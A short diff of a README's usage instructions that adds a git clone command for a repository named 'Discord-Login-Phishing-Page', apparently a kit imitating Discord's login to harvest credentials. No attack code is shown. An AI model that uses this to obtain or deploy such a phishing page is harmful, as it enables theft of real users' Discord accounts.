@@ -30,7 +30,7 @@ This project includes:
 ### How to Use
 1. Clone this repository:
    ```bash
-   git clone 
+   git clone https://github.com/maxx-007/Discord-Login-Phishing-Page
 
 # Technologies Used
 
